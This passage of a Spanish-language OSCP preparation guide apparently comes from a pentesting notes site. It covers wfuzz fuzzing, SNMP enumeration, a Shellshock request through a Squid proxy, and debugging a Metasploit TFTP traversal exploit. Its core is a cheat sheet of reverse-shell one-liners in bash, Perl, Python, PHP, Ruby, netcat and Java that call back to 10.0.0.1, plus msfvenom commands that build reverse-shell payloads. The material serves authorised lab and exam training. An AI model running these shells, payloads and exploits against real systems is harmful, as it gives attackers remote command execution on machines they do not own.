LHF\n</code></pre> <p>Sobre el servicio FTP resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexi\u00f3n TCP reversa.</p> <p>Sobre el servicio ms-sql-s, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticaci\u00f3n v\u00eda sqsh contra el servicio proporcionando las credenciales sa de usuario sin contrase\u00f1a. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta mssql.py</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wfuzz","title":"Wfuzz","text":"<p>Aunque tambi\u00e9n se puede hacer uso de Dirbuster, siempre he sido m\u00e1s partidiario de lidiar con Wfuzz. La sintaxis general para la b\u00fasqueda de directorios que empleo es la siguiente:</p> <pre><code>wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ\n</code></pre> <p>En caso de querer recorrer un rango num\u00e9rico, por ejemplo para un caso pr\u00e1ctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.</p> <p>Esta parte me recuerda sobre todo a una m\u00e1quina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la m\u00e1quina. Con el objetivo de determinar estos puertos, podemos atender a los c\u00f3digos de estado del lado de la respuesta del servidor, ocultando por ejemplo el c\u00f3digo de estado 404:</p> <pre><code>wfuzz -c --hc=404 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ\n</code></pre> <p>De esta forma, se nos mostrar\u00e1 \u00fanicamente resultados donde se devuelva un c\u00f3digo de estado diferente al 404.</p> <p>De manera alternativa, tambi\u00e9n podr\u00edamos haber aplicado lo siguiente:</p> <pre><code>wfuzz -c --sc=200 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ\n</code></pre> <p>Para mostrar peticiones que devuelvan un 200 c\u00f3mo c\u00f3digo de estado. Al igual que el c\u00f3digo de estado se pueden jugar con m\u00e1s par\u00e1metros de filtro, como los caracteres, el n\u00famero total de l\u00edneas, etc.</p> <p>Importante: A la hora de obtener un Forbidden en el c\u00f3digo de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos v\u00e1lidos vemos que estos son visibles desde la web.</p> <p>Para tener un caso pr\u00e1ctico, supongamos que tenemos un directorio /design que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeraci\u00f3n de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.</p> <p>Para ello, nos creamos un fichero extensions.txt con el siguiente contenido:</p> <pre><code>php\ntxt\nhtml\nxml\ncgi\n</code></pre> <p>Posteriormente, hacemos uso de Wfuzz siguiendo la siguiente sintaxis:</p> <p><code>wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z</code></p> <p>De esta forma, estaremos para cada una de las l\u00edneas del payload principal comprobando las extensiones especificadas sobre el segundo payload.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#nikto","title":"Nikto","text":"<p>Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatizaci\u00f3n que admiten en el examen y a veces devuelve maravillas... detallo su uso:</p> <p><code>nikto -h http://192.168.1.X</code></p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#snmp-enumeration","title":"SNMP Enumeration","text":"<p>Aunque se trata de un servicio que corre bajo un puerto por UDP, parece inofensivo pero la enumeraci\u00f3n sobre dicho servicio nos puede permitir enumerar m\u00e1s de la cuenta a nivel de sistema para saber qu\u00e9 software corren, as\u00ed como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.</p> <p>Para detectar si el servicio est\u00e1 operativo:</p> <pre><code>nmap -p161 -sU --open -T5 -v -n 192.168.1.X\n</code></pre> <p>En caso de estar abierto, lo primero ser\u00e1 averiguar la Community String. Generalmente suele ser public, pero por si acaso, nos montamos un ligero diccionario:</p> <pre><code>\u250c\u2500[s4vitar@parrot]\u2500[~/Desktop]\n\u2514\u2500\u2500\u257c $echo -e \"public\\nprivate\\nmanager\" &gt; community.txt\n\u250c\u2500[s4vitar@parrot]\u2500[~/Desktop]\n\u2514\u2500\u2500\u257c $cat community.txt \npublic\nprivate\nmanager\n</code></pre> <p>Una vez creado, utilizamos onesixtyone para bruteforcear la Community String del servicio:</p> <pre><code>onesixtyone -c community.txt -i ficheroIPS.txt\nScanning 2 hosts, 3 communities\n10.11.1.X [public] Linux example 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686\n10.11.1.Y [public] Linux example 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686\n</code></pre> <p>Con esto, tras ver que la Community String es public, consideramos los siguientes valores MIB:</p> <pre><code>1.3.6.1.2.1.25.1.6.0 System Processes\n1.3.6.1.2.1.25.4.2.1.2 Running Programs\n1.3.6.1.2.1.25.4.2.1.4 Processes Path\n1.3.6.1.2.1.25.2.3.1.4 Storage Units\n1.3.6.1.2.1.25.6.3.1.2 Software Name\n1.3.6.1.4.1.77.1.2.25 User Accounts\n1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n</code></pre> <p>Hay muchos m\u00e1s... pero a modo de ejemplo son los m\u00e1s significativos. Suponiendo que quisi\u00e9ramos saber qu\u00e9 procesos corre el sistema, aplicar\u00edamos el siguiente comando desde snmpwalk:</p> <pre><code>$~ snmpwalk -c public -v1 10.11.1.X 1.3.6.1.2.1.25.1.6.0\n</code></pre> <p>Inmediatamente, obtendremos una lista de los procesos que corren bajo el sistema.</p> <p>En caso de querer aplicar un an\u00e1lisis exhaustivo sin especificaci\u00f3n de valor MIB, aplicamos el siguiente comando:</p> <pre><code>$~ snmpwalk -c public -v1 10.11.1.X\n</code></pre> <p>Y seguidamente, se nos listar\u00e1 mont\u00f3n de informaci\u00f3n relevante de la m\u00e1quina. Aunque parezca tonter\u00eda, hay ocasiones en las que gracias a ver la versi\u00f3n de un servicio en concreto a trav\u00e9s del SNMP, he podido explotar una vulnerabilidad que jam\u00e1s habr\u00eda podido encontrar desde fuera, por lo que lo considero un servicio fundamental a enumerar.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#reverse-shell","title":"Reverse Shell","text":"<p>Un paso fundamental a la hora de logar RCE es tener controlados los tipos de conexiones reversas que podemos entablar en distintos lenguajes. Adjunto por aqu\u00ed un listado de las m\u00e1s utilizadas:</p> <p>Bash</p> <pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n</code></pre> <p>Perl</p> <pre><code>perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre> <p>Python</p> <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre> <p>PHP</p> <pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> <p>Ruby</p> <pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre> <p>Netcat</p> <pre><code>nc -e /bin/sh 10.0.0.1 1234\n</code></pre> <p>Netcat (Wrong Version)</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre> <p>Java</p> <pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre> <p>As\u00ed mismo, podemos hacer uso de Metasploit para la creaci\u00f3n de nuestros archivos maliciosos:</p> <p>PHP (Metasploit)</p> <pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.php\n</code></pre> <p>ASP (No Metasploit)</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp &gt; shell.asp\n</code></pre> <p>WAR (Sesi\u00f3n v\u00eda Netcat)</p> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war &gt; shell.war\n</code></pre> <p>JSP (Sesi\u00f3n v\u00eda Netcat)</p> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.jsp\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#spawning-a-tty-shell","title":"Spawning a TTY Shell","text":"<p>Aunque en el apartado de Tratamiento de la TTY en la secci\u00f3n de Pentesting para Linux, detallo una t\u00e9cnica para mejorar y construir una Shell totalmente interactiva, s\u00ed que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuaci\u00f3n algunas de ellas:</p> <ul> <li>python -c 'import pty; pty.spawn(\"/bin/sh\")'</li> <li>echo os.system('/bin/bash') </li> <li>/bin/sh -i</li> <li>perl -e 'exec \"/bin/sh\";'</li> <li>perl: exec \"/bin/sh\";</li> <li>ruby: exec \"/bin/sh\"</li> <li>lua: os.execute('/bin/sh')</li> <li>exec \"/bin/sh\" (Desde IRB)</li> <li>:!bash (Desde vi)</li> <li>:set shell=/bin/bash:shell (Desde vi)</li> <li>!sh (Desde nmap)</li> <li>find /etc/passwd -exec /bin/bash \\;</li> </ul>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#compilado-de-exploits-para-windows","title":"Compilado de Exploits para Windows","text":"<p>Desde Linux, a la hora de compilar algunos de los exploits que figuren en Searchsploit (generalmente en C), aplicaremos el siguiente comando:</p> <pre><code>i686-w64-mingw32-gcc exploit.c -o exploit\n</code></pre> <p>Para m\u00e1quinas Windows de 32 bits, aplicamos el siguiente comando:</p> <pre><code>i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#squid-proxy","title":"Squid Proxy","text":"<p>Alguna que otra m\u00e1quina me he encontrado con esta novedad (tampoco es tan moderno su uso). Una buena m\u00e1quina para practicar el concepto es la m\u00e1quina SickOS 1.1 de VulnHub.</p> <p>La idea es la siguiente, presento el reporte de un escaneo a modo de ejemplo:</p> <pre><code>TCP: 22     SSH  OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)\n\nTCP: 3128   HTTP-Proxy  Squid http proxy 3.1.19\n</code></pre> <p>Como vemos, s\u00f3lo figuran esos 2 puertos, sin embargo... el uso del Squid nos puede servir para descubrir un par de puertos m\u00e1s. Squid no es m\u00e1s que un servidor proxy para web con cach\u00e9. </p> <p>Aunque orientado principalmente a HTTP y HTTPS, soporta tambi\u00e9n otros protocolos como FTP e incluso Gopher. De entre algunas de las funcionalidades que esta utilidad tiene, destaca:</p> <p>Proxy con cach\u00e9 de HTTP, FTP, y otros protocolos de internet</p> <p>Squid proporciona un servicio de proxy que soporta peticiones HTTP, HTTPS y FTP a equipos que necesiten acceder a internet y a su vez provee la funcionalidad de cach\u00e9 especializado en el cual almacena de forma local las p\u00e1ginas consultadas recientemente por los usuarios.</p> <p>Tan interesante resulta la utilidad que hasta Metasploit cuenta con su propio m\u00f3dulo de enumeraci\u00f3n de SQUID (auxiliary/scanner/http/squid_pivot_scanning), desde donde podemos descubrir nuevos puertos que figuren abiertos.</p> <p>Podemos configurar un escaneo desde nikto para que aproveche dicho Squid proxy, esto hace que en caso de contar con un servicio web por el puerto 80 podamos obtener cierta informaci\u00f3n relevante sobre el mismo:</p> <pre><code>$~ nikto -h direccionIP -useproxy http://direccionIP:puerto\n</code></pre> <p>Algo interesante es aprovechar la configuraci\u00f3n de Firefox para desde la pesta\u00f1a 'Network', a\u00f1adir un nuevo 'Manual proxy configuration', el cual como campo HTTP Proxy disponga la IP del equipo y como puerto el que figure como servicio Squid Proxy. Una vez hecho, con acceder directamente a la IP, si esta cuenta con un servicio web por el puerto convencional la veremos directamente desde el navegador.</p> <p>Las consultas las podemos realizar tambi\u00e9n desde curl, empleando para ello una sintaxis como la que se define a continuaci\u00f3n:</p> <pre><code>$~ curl --proxy ip:puerto http://ip/cgi-bin/status # A modo de ejemplo\n</code></pre> <p>Suponiendo que la web posteriormente es vulnerable a un ataque ShellShock, podr\u00edamos realizar la siguiente petici\u00f3n para ejecutar comandos sobre el sistema:</p> <pre><code>curl -v --proxy ip:puerto \\\n  http://ip/cgi-bin/status \\ \n  -H \"Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit\"\n</code></pre> <p>Obteniendo la siguiente respuesta del lado del servidor:</p> <pre><code>*   Trying ip...\n* Connected to ip (ip) port puerto (#0)\n* HTTP 1.0, assume close after body\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n* Closing connection 0\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#metasploit-debugging","title":"Metasploit Debugging","text":"<p>Muchas han sido las veces que lanzando un exploit el cual aparentemente parece reunir todos los requisitos necesarios para una explotaci\u00f3n exitosa desde Metasploit, no rula, peta o incluso no nos devuelve ning\u00fan tipo de Verbose. Para lidiar con esto, existe una peque\u00f1a utilidad externa la cual nos permite Debuggear el programa en tiempo de ejecuci\u00f3n, permiti\u00e9ndonos as\u00ed saber qu\u00e9 valores est\u00e1n tomando todas las variables as\u00ed como conocer si se est\u00e1n recogiendo bien los valores que fijamos desde las opciones de configuraci\u00f3n.</p> <p>Otra opci\u00f3n tambi\u00e9n recomendable y que trataremos en este punto consiste en configurar un Proxy desde Burpsuite, de manera que primero el Exploit pasa por el intermediario (\u00fatil para ver c\u00f3mo viaja nuestra petici\u00f3n), y luego enruta al Host remoto.</p> <p>1. Pry-ByeBug</p> <p>Antes que nada, para evitar que nuestro Metasploit corrompa, creamos una instancia del recurso sobre el directorio /opt:</p> <pre><code>$~ cp -r /usr/share/metasploit-framework /opt/.\n</code></pre> <p>Una vez hecho, creamos el siguiente recurso en ~/.pryrc:</p> <pre><code>if defined?(PryByebug)\n  Pry.commands.alias_command 'c', 'continue'\n  Pry.commands.alias_command 's', 'step'\n  Pry.commands.alias_command 'n', 'next'\n  Pry.commands.alias_command 'f', 'finish'\nend\n\nPry::Commands.command /^$/, \"repeat last command\" do\n  _pry_.run_command Pry.history.to_a.last\nend\n</code></pre> <p>Nos resultar\u00e1 de utilidad para poder jugar con Alias en vez de escribir la instrucci\u00f3n entera. Aplicamos el siguiente comando para instalar pry-byebug:</p> <pre><code>$~ gem 'pry-byebug'\n</code></pre> <p>Una vez hecho, abrimos nuestro recurso /opt/metasploit-framework/msfconsole con nuestro editor preferido y a\u00f1adimos como requerimiento el pry-byebug de la siguiente forma:</p> <pre><code>#\n# Standard Library\n#\n\nrequire 'pathname'\nrequire 'pry-byebug' # Nueva l\u00ednea a insertar, las dem\u00e1s est\u00e1n por defecto.\n\nif ENV['METASPLOIT_FRAMEWORK_PROFILE'] == 'true'\n</code></pre> <p>Para poner un caso pr\u00e1ctico, vamos a ponerlo en pr\u00e1ctica con la m\u00e1quina Dropzone de HackTheBox. Esta m\u00e1quina se puede comprometer a trav\u00e9s de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.</p> <p>El servicio a atacar es el TFTP, y el m\u00f3dulo es el exploit/windows/tftp/distinct_tftp_traversal. Este exploit, cuenta con las siguientes configuraciones:</p> <pre><code>Module options (exploit/windows/tftp/distinct_tftp_traversal):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   DEPTH  10               no        Levels to reach base directory\n   RHOST                   yes       The remote TFTP server address\n   RPORT  69               yes       The remote TFTP server port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Distinct TFTP 3.10 on Windows\n</code></pre> <p>En este caso, podemos aplicar un LFI sobre el servicio, siendo la variable DEPTH la correspondiente al n\u00famero de veces que queremos retroceder hasta llegar a la ruta ra\u00edz. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.</p> <p>\u00bfC\u00f3mo podr\u00edamos haber sabido esto sin mirar el c\u00f3digo?, pry-byebug ser\u00e1 la respuesta a nuestros problemas.</p> <p>Lo que haremos ser\u00e1 generar una instancia del m\u00f3dulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #searchsploit -m exploits/windows/webapps/41714.rb\n  Exploit: Distinct TFTP 3.10 - Writable Directory Traversal Execution (Metasploit)\n      URL: https://www.exploit-db.com/exploits/41714/\n     Path: /usr/share/exploitdb/exploits/windows/webapps/41714.rb\nFile Type: Ruby script, ASCII text, with CRLF line terminators\n\nCopied to: /home/s4vitar/Desktop/41714.rb\n\n\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb\n</code></pre> <p>Recordemos que jugamos con instancias para evitar que el binario original pete por alguna raz\u00f3n. Una vez hecho, dado que hemos importado la utilidad pry-byebug en la nueva instancia de msfconsole, lo que nos queda es establecer un BreakPoint sobre el m\u00f3dulo que queremos Debuggear. </p> <p>Para ello, abrimos la instancia del m\u00f3dulo, y a\u00f1adimos la siguiente l\u00ednea (lo har\u00e9 en la siguiente porci\u00f3n de c\u00f3digo):</p> <pre><code>  def exploit\n    peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n\n    # Setup the necessary files to do the wbemexec trick\n    binding.pry # &lt;-------------------------------- Nueva l\u00ednea que hemos a\u00f1adido\n    exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n</code></pre> <p>\u00bfQu\u00e9 consguimos con esto?, vamos a comprobarlo. Correremos el msfconsole desde la ruta /opt/metasploit-framework/msfconsole, posteriormente seleccionaremos el nuevo m\u00f3dulo clonado, setearemos el DEPTH a 0, configuramos el resto de variables y le daremos a run:</p> <pre><code>\u250c\u2500[\u2717]\u2500[root@parrot]\u2500[/opt/metasploit-framework]\n\u2514\u2500\u2500\u257c #/opt/metasploit-framework/msfconsole -q\n[*] Starting persistent handler(s)...\nmsf &gt; use exploit/windows/tftp/exploit_tftp \nmsf exploit(windows/tftp/exploit_tftp) &gt; show options\n\nModule options (exploit/windows/tftp/exploit_tftp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   DEPTH  10               no        Levels to reach base directory\n   RHOST                   yes       The remote TFTP server address\n   RPORT  69               yes       The remote TFTP server port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Distinct TFTP 3.10 on Windows\n\n\nmsf exploit(windows/tftp/exploit_tftp) &gt; set DEPTH 0\nDEPTH =&gt; 0\nmsf exploit(windows/tftp/exploit_tftp) &gt; set RHOST 192.168.1.12\nRHOST =&gt; 192.168.1.12\nmsf exploit(windows/tftp/exploit_tftp) &gt; run\n</code></pre> <p>Una vez hecho, obtendremos los siguientes resultados:</p> <pre><code>msf exploit(windows/tftp/exploit_tftp) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.51:4444 \nFound plugin pry-byebug, but could not require 'pry-byebug'\ncannot load such file -- pry-byebug\n\nFrom: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:\n\n     81: def exploit\n     82:   peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n     83: \n     84:   # Setup the necessary files to do the wbemexec trick\n     85:   binding.pry\n =&gt;  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n     87:   exe      = generate_payload_exe\n     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n     89:   mof      = generate_mof(mof_name, exe_name)\n     90: \n     91:   # Configure how deep we want to traverse\n     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']\n     93:   levels = \"../\" * depth\n     94: \n     95:   # Upload the malicious executable to C:\\Windows\\System32\\\n     96:   print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n     97:   upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n     98: \n     99:   # Let the TFTP server idle a bit before sending another file\n    100:   select(nil, nil, nil, 1)\n    101: \n    102:   # Upload the mof file\n    103:   print_status(\"#{peer} - Uploading .mof...\")\n    104:   upload(\"#{levels}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    105: end\n\n[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;\n</code></pre> <p>En este preciso instante, nos situar\u00edamos en la l\u00ednea 86 del c\u00f3digo del programa, manteniendo el mismo en estado de pausa (esto es as\u00ed debido a que es en la l\u00ednea superior donde hemos fijado el Breakpoint).</p> <p>Llegados a este punto, si nos fijamos, en esa misma l\u00ednea se va a almacenar un valor para la variable exe_name, \u00bfpodr\u00edamos ver el valor que se almacena en dicha variable?, la respuesta es s\u00ed... para ello necesitamos avanzar una instrucci\u00f3n en la l\u00ednea del programa para posteriormente ver su contenido. Lo har\u00edamos de la siguiente forma:</p> <pre><code>[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; n\n\nFrom: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 87 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:\n\n     81: def exploit\n     82:   peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n     83: \n     84:   # Setup the necessary files to do the wbemexec trick\n     85:   binding.pry\n     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n =&gt;  87:   exe      = generate_payload_exe\n     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n     89:   mof      = generate_mof(mof_name, exe_name)\n     90: \n     91:   # Configure how deep we want to traverse\n     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']\n     93:   levels = \"../\" * depth\n     94: \n     95:   # Upload the malicious executable to C:\\Windows\\System32\\\n     96:   print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n     97:   upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n     98: \n     99:   # Let the TFTP server idle a bit before sending another file\n    100:   select(nil, nil, nil, 1)\n    101: \n    102:   # Upload the mof file\n    103:   print_status(\"#{peer} - Uploading .mof...\")\n    104:   upload(\"#{levels}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    105: end\n\n[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; exe_name\n=&gt; \"xMDsIBr.exe\"\n[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;\n</code></pre> <p>Donde como vemos, el valor que est\u00e1 almacenando dicha variable es xMDsIBr.exe. De igual manera, podr\u00edamos ver como las variables depth y levels no toman el valor que deber\u00edan. Para ello, podremos establecer un Breakpoint en la l\u00ednea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.</p> <p>Aplicamos los siguientes comandos:</p> <pre><code>[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; break 96\n\n  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) \n\n      93:     levels = \"../\" * depth\n    94: \n    95:     # Upload the malicious executable to C:\\Windows\\System32\\\n =&gt; 96:     print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n    97:     upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n    98: \n    99:     # Let the TFTP server idle a bit before sending another file\n\n\n[3] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; c\n\n  Breakpoint 1. First hit\n\nFrom: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:\n\n     81: def exploit\n     82:   peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n     83: \n     84:   # Setup the necessary files to do the wbemexec trick\n     85:   binding.pry\n     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n     87:   exe      = generate_payload_exe\n     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n     89:   mof      = generate_mof(mof_name, exe_name)\n     90: \n     91:   # Configure how deep we want to traverse\n     92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']\n     93:   levels = \"../\" * depth\n     94: \n     95:   # Upload the malicious executable to C:\\Windows\\System32\\\n =&gt;  96:   print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n     97:   upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n     98: \n     99:   # Let the TFTP server idle a bit before sending another file\n    100:   select(nil, nil, nil, 1)\n    101: \n    102:   # Upload the mof file\n    103:   print_status(\"#{peer} - Uploading .mof...\")\n    104:   upload(\"#{levels}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    105: end\n\n[3] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; depth\n=&gt; 10\n[4] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; levels\n=&gt; \"../../../../../../../../../../\"\n[5] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt;\n</code></pre> <p>Como vemos, el valor de la variable levels es (../../../../../../../../../../), lo que hace que nos planteemos que no se est\u00e1 almacenando correctamente el valor de nuestro DEPTH. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente l\u00ednea del programa:</p> <pre><code>92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']\n</code></pre> <p>Donde como vemos, se especifica claramente que en caso de que el valor de DEPTH valga 0, esta se igualar\u00e1 a 10. Por lo que, deber\u00edamos cambiar la declaraci\u00f3n a lo siguiente:</p> <pre><code>92:   depth  = datastore['DEPTH']\n</code></pre> <p>Una vez hecho, podremos ver como los valores de DEPTH y de levels son declarados correctamente:</p> <pre><code>msf exploit(windows/tftp/exploit_tftp) &gt; show options\n\nModule options (exploit/windows/tftp/exploit_tftp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   DEPTH  10               no        Levels to reach base directory\n   RHOST                   yes       The remote TFTP server address\n   RPORT  69               yes       The remote TFTP server port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Distinct TFTP 3.10 on Windows\n\n\nmsf exploit(windows/tftp/exploit_tftp) &gt; set DEPTH 0\nDEPTH =&gt; 0\nmsf exploit(windows/tftp/exploit_tftp) &gt; set RHOST 192.168.1.42\nRHOST =&gt; 192.168.1.42\nmsf exploit(windows/tftp/exploit_tftp) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.51:4444 \nFound plugin pry-byebug, but could not require 'pry-byebug'\ncannot load such file -- pry-byebug\n\nFrom: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:\n\n     81: def exploit\n     82:   peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n     83: \n     84:   # Setup the necessary files to do the wbemexec trick\n     85:   binding.pry\n =&gt;  86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n     87:   exe      = generate_payload_exe\n     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n     89:   mof      = generate_mof(mof_name, exe_name)\n     90: \n     91:   # Configure how deep we want to traverse\n     92:   depth  = 